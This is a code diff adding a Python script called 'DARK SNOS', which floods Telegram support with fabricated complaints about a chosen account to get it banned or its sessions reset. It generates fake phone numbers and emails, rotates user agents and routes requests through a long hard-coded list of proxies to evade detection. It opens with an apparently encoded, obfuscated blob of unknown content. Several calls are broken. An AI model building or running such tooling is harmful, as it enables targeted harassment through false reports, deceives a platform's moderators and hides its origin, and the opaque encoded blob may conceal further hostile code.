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'))
+from fake_useragent import UserAgent
+import requests
+import random
+from termcolor import colored
+import pyfiglet
+
+number = +79999999999
+
+
+
+# ASCII-арт приветствия
+ascii_banner = pyfiglet.figlet_format("DARK SNOS")
+colored_banner = colored(ascii_banner, color='magenta')  # Красим в цвет
+
+def generate_phone_number():
+    
+    country_codes = ['+7', '+380', '+375']
+    
+   
+    country_code = random.choice(country_codes)
+    
+ 
+    phone_number = ''.join(random.choices('0123456789', k=10))
+    
+    formatted_phone_number = f'{country_code}{phone_number}'
+    
+    return formatted_phone_number
+
+import string
+
+def generate_random_email():
+   
+	  
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
+    
+    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))  
+    domain = random.choice(domains) 
+    
+    email = f"{username}@{domain}"  
+    
+    return email
+    
+def generate_phone_number1():
+  
+    country_codes = ['+7', '+380', '+375']
+    
+    
+    country_code = random.choice(country_codes)
+    
+    phone_number = ''.join(random.choices('0123456789', k=10))
+    
+  
+    formatted_phone_number = f'{country_code}{phone_number}'
+    
+    return formatted_phone_number
+
+def generate_random_email1():
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
+    
+    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))  
+    domain = random.choice(domains)  
+    
+    email = f"{username}@{domain}"  
+    
+    return email
+    
+def send_complaint(username, telegram_id, number, email, repeats, complaint_choice, proxies=None):
+	url = 'https://telegram.org/support'
+	user_agent = UserAgent().random
+	headers = {'User-Agent': user_agent}
+	complaints_sent = 0
+
+	if complaint_choice == "1":
+		text = f'Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!'
+	elif complaint_choice == "2":
+		text = f'Аккаунт {username}, {telegram_id} приобрёл премиум в вашем сервисе чтобы обходить наказания за спам и совершает спам-рассылки в личные сообщения пользователям и в чаты. Прошу проверить информацию!'
+	elif complaint_choice == "3":
+		text = f"Здраствуйте. Аккаунт {username}, id {telegram_id} оскорбляет меня и мою маму. Мне это очень не приятно, поэтому и пишу вам. Огромная прозьба разобраться и заблокировать данного пользователя т.к это нарушает политику сервиса. Блгаодарю"
+	elif complaint_choice == "4":
+		text = f"Здраствуйте. Аккаунт {username}, id {telegram_id}. Очень много и частно нарушает политику сервиса Телеграмм. А именно, оскорбляет, сливает личные данные юзеров. Продает различные услуги. Прозьба разобраться и наказать данный аккаунт."
+        	
+	elif complaint_choice == "5": 
+		text = f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {username}, а мой айди, если злоумышленник поменял юзернейм —  {telegram_id} . Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
+	elif complaint_choice == "6":
+		text = f"Здраствуйте, сидя на просторах сети телеграмм, я заметил пользователя который совершает спам-рассылки, мне и другим пользователям это очень не нравится.Его аккаунт: {username}, ID {telegram_id}.Огромная прозьба разобраться с этим и заблокировать данного пользователя. Заранее спасибо."
+
+	elif complaint_choice == "7":
+		text = f"Сидя на просторах телеграмма заметил юзера который продает услуги dеаnонa и лжеминирования, сыллка на канал и юзер админа: {username}, id админа: {telegram_id}. Большая прозьба заблокировать канал и пользователя, т.к это нарушает политику сервиса."
+       
+	elif complaint_choice == "8":
+		text = f"На сервисе telegram обнаружил пользователя который накручивает на канал реакции, подписки и просмотры. Сыллка на посты с накруткой и аккаунт администратора: {username}, id администратора на случай если поменяет юзернейм: {telegram_id}. Прозьба разобраться и заблокировать пользователя т.к это нарушает правила telegramm"
+       
+	payload = {'text': text, 'number': number, 'email': email}
+
+	try:
+		for _ in range(int(repeats)):
+			response = requests.post(url, headers=headers, data=payload, proxies=proxies)
+			if response.status_code == 200:
+				complaints_sent += 1
+				print(colored(f"Жалоба успешно отправлена", 'green'))
+				print(colored(f"От: {email} {number}", 'cyan'))
+			else:
+				print("Не удалось отправить. code:", response.status_code)
+	except Exception as e:
+		print("An error occurred:", str(e))
+
+
+
+  
+
+
+
+def complaint():
+	print(colored_banner)
+	print(colored("[1] Виртуальный номер", "magenta"))
+	print(colored("[2] Премиум","magenta"))
+	print(colored("[3] Оскорбление","magenta"))
+	print(colored("[4] Нарушение правил", "magenta"))
+	print(colored("[5] Cнос Сессий", "magenta"))
+	print(colored("[6] Спам", "magenta"))
+	print(colored("[7] Прайс", "magenta"))
+	print(colored("[8] Накрутка", "magenta"))
+	complaint_choice = input(colored("Введите причину сноса-> ", "magenta"))
+
+	if complaint_choice in ["1", "2", "3", "4", "6", "7", "8"]:
+		username = input("Введите @username: ")
+		telegram_id = input("Введите Telegram ID: ")
+		repeats = int(input("Введите количество жалоб: "))
+		for _ in range(repeats):
+			number = generate_phone_number()
+			email = generate_random_email()
+			proxies_list = [
+            '8.218.149.193:80',
+            '47.57.233.126:80',
+            '47.243.70.197:80',
+            '8.222.193.208:80',
+            '144.24.85.158:80',
+            '47.245.115.6:80',
+            '47.245.114.163:80'
+            '45.4.55.10:40486', 
+            '103.52.37.1:4145',
+             '200.34.227.204:4153', 
+             '190.109.74.1:33633',
+             '200.54.221.202:4145', 
+             '36.67.66.202:5678',
+             '168.121.139.199:4145',
+             '101.255.117.2:51122',
+             '45.70.0.250:4145',
+             '78.159.199.217:1080', 
+             '67.206.213.202:4145', 
+             '14.161.48.4:4153',
+             '119.10.179.33:5430',
+             '109.238.222.1:4153',
+             '103.232.64.226:4145',
+             '183.88.212.247:1080', 
+             '116.58.227.197:4145', 
+             '1.20.97.181:34102', 
+             '103.47.93.214:1080',
+              '89.25.23.211:4153', 
+              '185.43.249.132:39316',
+              '188.255.209.149:1080',
+              '178.216.2.229:1488', 
+               '92.51.73.14:4153', 
+              '109.200.156.2:4153',
+               '89.237.33.193:51549',
+               '211.20.145.204:4153', 
+               '45.249.79.185:3629',
+                '208.113.223.164:21829',
+                '62.133.136.75:4153', 
+                '46.99.135.154:4153', 
+                '1.20.198.254:4153',
+                '196.6.234.140:4153', 
+                '118.70.196.124:4145',
+                '185.34.22.225:46169',
+                '103.47.93.199:1080',
+                 '222.129.34.122:57114',
+                 '92.247.127.249:4153',
+                 '186.150.207.141:1080',
+                 '202.144.201.197:43870',
+                 '103.106.32.105:31110', 
+                 '200.85.137.46:4153',
+                 '116.58.254.9:4145', 
+                 '101.51.141.122:4153',
+                 '83.69.125.126:4145',
+                 '187.62.88.9:4153', 
+                 '122.54.134.176:4145', 
+                 '170.0.203.11:1080', 
+                 '187.4.165.90:4153',
+                 '159.224.243.185:61303',
+                 '103.15.242.216:55492', 
+                 '187.216.81.183:37640',
+                 '176.197.100.134:3629', 
+                 '101.51.105.41:4145',
+                 '46.13.11.82:4153', 
+                 '103.221.254.125:40781', 
+                 '177.139.130.157:4153', 
+                 '1.10.189.133:50855', 
+                 '69.70.59.54:4153', 
+                 '83.103.195.183:4145', 
+                 '190.109.168.241:42732',
+                 '103.76.20.155:43818',
+                 '84.47.226.66:4145', 
+                 '1.186.60.25:4153',
+                 '93.167.67.69:4145',
+                 '202.51.112.22:5430', 
+                 '213.6.204.153:42820',
+                 '184.178.172.14:4145', 
+                 '217.171.62.42:4153',
+                 '121.13.229.213:61401',
+                 '101.255.140.101:1081',
+                  '78.189.64.42:4145',
+                  '187.11.232.71:4153', 
+                  '190.184.201.146:32606',                           '195.34.221.81:4153', 
+                  '200.29.176.174:4145', 
+                  '103.68.35.162:4145', 
+                  '194.135.97.126:4145',
+                  '167.172.123.221:9200',
+                  '200.218.242.89:4153',
+                  '190.7.141.66:40225',
+                  '186.103.154.235:4153',
+                  '118.174.196.250:4153',
+                  '213.136.89.190:52010',
+                  '217.25.221.60:4145',
+                  '50.192.195.69:39792',
+                  '180.211.162.114:44923',                           '179.1.1.11:4145', 
+                  '41.162.94.52:30022',
+                  '103.211.11.13:52616',
+                  '103.209.65.12:6667',
+                  '101.51.121.29:4153',
+                  '190.13.82.242:4153', 
+                  '103.240.33.185:8291',
+                  '202.51.100.33:5430',
+                  '201.220.128.92:3000', 
+                  '177.11.75.18:51327',
+                  '62.122.201.170:31871', 
+                  '79.164.171.32:50059',
+                  '202.124.46.97:4145', 
+                  '79.132.205.34:61731',
+                  '217.29.18.206:4145',
+                  '222.217.68.17:35165',
+                  '105.29.95.34:4153', 
+                  '103.226.143.254:1080',
+                  '119.82.251.250:31678', 
+                  '45.232.226.137:52104',
+                  '195.69.218.198:60687', 
+                  '155.133.83.161:58351', 
+                  '213.108.216.59:1080', 
+                  '178.165.91.245:3629',
+                  '124.158.150.205:4145',
+                  '36.72.118.156:4145', 
+                  '177.93.79.18:4145', 
+                  '103.47.94.97:1080', 
+                  '78.140.7.239:40009', 
+                  '187.19.150.221:80', 
+                  '103.192.156.171:4145', 
+                  '36.67.27.189:49524', 
+                  '188.136.167.33:4145', 
+                  '91.226.5.245:36604', 
+                  '78.90.81.184:42636', 
+                  '189.52.165.134:1080', 
+                  '81.183.253.34:4145', 
+                  '95.154.104.147:31387', 
+                  '220.133.209.253:4145', 
+                  '182.52.108.104:14153', 
+                  '195.93.173.24:9050', 
+                  '170.244.64.129:31476', 
+                  '117.102.124.234:4145', 
+                  '190.210.3.210:1080', 
+                  '182.253.142.11:4145', 
+                  '176.98.156.64:4145', 
+                  '210.48.139.228:4145', 
+                  '177.39.218.70:4153', 
+                  '112.78.134.229:41517', 
+                  '119.46.2.245:4145', 
+                  '103.212.94.253:41363', 
+                  '190.109.72.41:33633', 
+                  '103.94.133.94:4153', 
+                  '190.151.94.2:56093', 
+                  '190.167.220.7:4153', 
+                  '94.136.154.53:60030', 
+                  '103.206.253.59:53934', 
+                  '69.163.160.185:29802', 
+                  '213.6.221.162:5678', 
+                  '96.9.86.70:53304', 
+                  '202.182.54.186:4145', 
+                  '192.140.42.83:59057', 
+                  '138.121.198.90:42494', 
+                  '190.121.142.166:4153', 
+                  '190.0.242.217:51327', 
+                  '103.35.108.145:4145', 
+                  '82.114.83.238:4153', 
+                  '195.22.253.235:4145', 
+                  '91.219.100.72:4153', 
+                  '212.3.109.7:4145', 
+                  '45.7.177.226:39867', 
+                  '202.5.37.241:49151', 
+                  '195.9.89.66:3629', 
+                  '190.186.1.46:33567', 
+                  '69.163.161.118:20243'
+			]
+			proxies = {'http': random.choice(proxies_list)}
+			send_complaint(username, telegram_id, number, email, 1, complaint_choice, proxies)
+	elif complaint_choice == '5':
+		username = input("Введите юзернейм: ")
+		telegram_id = input("Введите Telegram ID: ")
+		repeats = int(input("Введите количество жалоб: "))
+		number = input("Введите номер телефона аккаунта: ")
+		email = generate_random_email()
+		proxies_list = [
+            '8.218.149.193:80',
+            '47.57.233.126:80',
+            '47.243.70.197:80',
+            '8.222.193.208:80',
+            '144.24.85.158:80',
+            '47.245.115.6:80',
+            '47.245.114.163:80'
+            '45.4.55.10:40486', 
+            '103.52.37.1:4145',
+             '200.34.227.204:4153', 
+             '190.109.74.1:33633',
+             '200.54.221.202:4145', 
+             '36.67.66.202:5678',
+             '168.121.139.199:4145',
+             '101.255.117.2:51122',
+             '45.70.0.250:4145',
+             '78.159.199.217:1080', 
+             '67.206.213.202:4145', 
+             '14.161.48.4:4153',
+             '119.10.179.33:5430',
+             '109.238.222.1:4153',
+             '103.232.64.226:4145',
+             '183.88.212.247:1080', 
+             '116.58.227.197:4145', 
+             '1.20.97.181:34102', 
+             '103.47.93.214:1080',
+              '89.25.23.211:4153', 
+              '185.43.249.132:39316',
+              '188.255.209.149:1080',
+              '178.216.2.229:1488', 
+               '92.51.73.14:4153', 
+              '109.200.156.2:4153',
+               '89.237.33.193:51549',
+               '211.20.145.204:4153', 
+               '45.249.79.185:3629',
+                '208.113.223.164:21829',
+                '62.133.136.75:4153', 
+                '46.99.135.154:4153', 
+                '1.20.198.254:4153',
+                '196.6.234.140:4153', 
+                '118.70.196.124:4145',
+                '185.34.22.225:46169',
+                '103.47.93.199:1080',
+                 '222.129.34.122:57114',
+                 '92.247.127.249:4153',
+                 '186.150.207.141:1080',
+                 '202.144.201.197:43870',
+                 '103.106.32.105:31110', 
+                 '200.85.137.46:4153',
+                 '116.58.254.9:4145', 
+                 '101.51.141.122:4153',
+                 '83.69.125.126:4145',
+                 '187.62.88.9:4153', 
+                 '122.54.134.176:4145', 
+                 '170.0.203.11:1080', 
+                 '187.4.165.90:4153',
+                 '159.224.243.185:61303',
+                 '103.15.242.216:55492', 
+                 '187.216.81.183:37640',
+                 '176.197.100.134:3629', 
+                 '101.51.105.41:4145',
+                 '46.13.11.82:4153', 
+                 '103.221.254.125:40781', 
+                 '177.139.130.157:4153', 
+                 '1.10.189.133:50855', 
+                 '69.70.59.54:4153', 
+                 '83.103.195.183:4145', 
+                 '190.109.168.241:42732',
+                 '103.76.20.155:43818',
+                 '84.47.226.66:4145', 
+                 '1.186.60.25:4153',
+                 '93.167.67.69:4145',
+                 '202.51.112.22:5430', 
+                 '213.6.204.153:42820',
+                 '184.178.172.14:4145', 
+                 '217.171.62.42:4153',
+                 '121.13.229.213:61401',
+                 '101.255.140.101:1081',
+                  '78.189.64.42:4145',
+                  '187.11.232.71:4153', 
+                  '190.184.201.146:32606',                           
+                  '200.29.176.174:4145', 
+                  '103.68.35.162:4145', 
+                  '194.135.97.126:4145',
+                  '167.172.123.221:9200',
+                  '200.218.242.89:4153',
+                  '190.7.141.66:40225',
+                  '186.103.154.235:4153',
+                  '118.174.196.250:4153',
+                  '213.136.89.190:52010',
+                  '217.25.221.60:4145',
+                  '50.192.195.69:39792',
+                  '180.211.162.114:44923',                           
+                  '41.162.94.52:30022',
+                  '103.211.11.13:52616',
+                  '103.209.65.12:6667',
+                  '101.51.121.29:4153',
+                  '190.13.82.242:4153', 
+                  '103.240.33.185:8291',
+                  '202.51.100.33:5430',
+                  '201.220.128.92:3000', 
+                  '177.11.75.18:51327',
+                  '62.122.201.170:31871', 
+                  '79.164.171.32:50059',
+                  '202.124.46.97:4145', 
+                  '79.132.205.34:61731',
+                  '217.29.18.206:4145',
+                  '222.217.68.17:35165',
+                  '105.29.95.34:4153', 
+                  '103.226.143.254:1080',
+                  '119.82.251.250:31678', 
+                  '45.232.226.137:52104',
+                  '195.69.218.198:60687', 
+                  '155.133.83.161:58351', 
+                  '213.108.216.59:1080', 
+                  '178.165.91.245:3629',
+                  '124.158.150.205:4145',
+                  '36.72.118.156:4145', 
+                  '177.93.79.18:4145', 
+                  '103.47.94.97:1080', 
+                  '78.140.7.239:40009', 
+                  '187.19.150.221:80', 
+                  '103.192.156.171:4145', 
+                  '36.67.27.189:49524', 
+                  '188.136.167.33:4145', 
+                  '91.226.5.245:36604', 
+                  '78.90.81.184:42636', 
+                  '189.52.165.134:1080', 
+                  '81.183.253.34:4145', 
+                  '95.154.104.147:31387', 
+                  '220.133.209.253:4145', 
+                  '182.52.108.104:14153', 
+                  '195.93.173.24:9050', 
+                  '170.244.64.129:31476', 
+                  '117.102.124.234:4145', 
+                  '190.210.3.210:1080', 
+                  '182.253.142.11:4145', 
+                  '176.98.156.64:4145', 
+                  '210.48.139.228:4145', 
+                  '177.39.218.70:4153', 
+                  '112.78.134.229:41517', 
+                  '119.46.2.245:4145', 
+                  '103.212.94.253:41363', 
+                  '190.109.72.41:33633', 
+                  '103.94.133.94:4153', 
+                  '190.151.94.2:56093', 
+                  '190.167.220.7:4153', 
+                  '94.136.154.53:60030', 
+                  '103.206.253.59:53934', 
+                  '69.163.160.185:29802', 
+                  '213.6.221.162:5678', 
+                  '96.9.86.70:53304', 
+                  '202.182.54.186:4145', 
+                  '192.140.42.83:59057', 
+                  '138.121.198.90:42494', 
+                  '190.121.142.166:4153', 
+                  '190.0.242.217:51327', 
+                  '103.35.108.145:4145', 
+                  '82.114.83.238:4153', 
+                  '195.22.253.235:4145', 
+                  '91.219.100.72:4153', 
+                  '212.3.109.7:4145', 
+                  '45.7.177.226:39867', 
+                  '202.5.37.241:49151', 
+                  '195.9.89.66:3629', 
+                  '190.186.1.46:33567', 
+                  '69.163.161.118:20243'
+        ]
+		proxies = {'http': random.choice(proxies_list)}
+		send_complaint()
